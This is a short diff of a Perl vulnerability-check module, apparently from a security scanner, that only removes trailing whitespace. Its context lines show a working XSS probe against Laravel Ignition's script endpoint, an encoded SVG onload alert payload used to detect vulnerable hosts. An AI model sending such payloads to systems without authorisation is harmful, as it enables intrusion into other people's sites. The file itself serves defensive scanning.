@@ -20,7 +20,7 @@ package Spellbook::Advisory::Laravel_Ignition_XSS {
             if ($target !~ /^http(?:s)?:\/\//msx) {
                 $target = "https://$target";
             }
-            
+
             my @uuid      = Spellbook::Helper::Generate_UUID -> new(["--version" => 4, "--repeat" => 1]);
             my $payload   = "$target/_ignition/scripts/--%3E%3Csvg%20onload=alert%28$uuid[0]%29%3E";
             my $userAgent = Spellbook::Core::UserAgent -> new();
@@ -33,7 +33,7 @@ package Spellbook::Advisory::Laravel_Ignition_XSS {
             ) {
                 push @results, $target;
             }
-            
+
             return @results;
         }
 
